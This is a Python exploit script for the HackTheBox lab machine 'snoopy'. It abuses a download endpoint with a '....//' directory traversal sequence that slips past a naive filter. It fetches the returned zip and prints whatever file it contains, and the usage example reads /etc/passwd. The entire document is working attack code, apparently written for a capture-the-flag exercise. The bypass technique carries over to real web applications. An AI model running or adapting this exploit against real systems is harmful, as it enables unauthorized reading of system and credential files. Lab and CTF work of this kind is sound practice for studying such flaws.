#!/usr/bin/env python3

"""
Author: poorduck
Date: 2023-05-07
Description: Directory traversal exploit script for HackTheBox machine "snoopy"

Usage: python script.py [FILEPATH]
                        - Where FILEPATH is a absolute path of a file from root dir

Example: python script.py '/etc/passwd'

Pre-requirements:
    - Host must be added in the "/etc/hosts" file i.e "10.10.11.212 snoopy.htb"
"""

import zipfile
import requests
import sys

rhost = "http://snoopy.htb"
zip_fn = "press_release.zip"

def download_zip(url, zip_filename, filepath):
    response = requests.get(f"{url}/download?file={filepath}")
    if response.status_code == 200:
        print(f"... Content-Disposition header: {response.headers.get('Content-Disposition')}")
        with open(zip_filename, 'wb') as f:
            f.write(response.content)
        print(f"[+] File downloaded successfully to {zip_filename}")
    else:
        print("[-] Failed to download file")


def unzip_and_read(zip_file_path):
    try:
        with zipfile.ZipFile(zip_file_path, 'r') as zip_file:
            if not zip_file.namelist():
                print("[!] Zip file is empty.")
                return
            first_file = zip_file.namelist()[0]
            if not first_file:
                print("[!] Zip file contains no files.")
                return
            with zip_file.open(first_file) as first_file_handle:
                contents = first_file_handle.read().decode()
                print(f"[+] File content -\n\n{contents}")
    except zipfile.BadZipFile:
        print("[-] File is empty or it is not a valid zip file.")
    finally:
        import os; os.remove(zip_file_path) if os.path.isfile(zip_file_path) else None


if __name__ == "__main__":

    traversal = '....//....//....//..../'
    try:
        traversal += sys.argv[1]
    except IndexError as e:
        exit("Usage: script.py [FILEPATH]")

    try:
        download_zip(url=rhost, zip_filename=zip_fn, filepath=traversal)
        unzip_and_read(zip_file_path=zip_fn)
    except KeyboardInterrupt as e:
        print(e)
    except Exception as e:
        print(e)
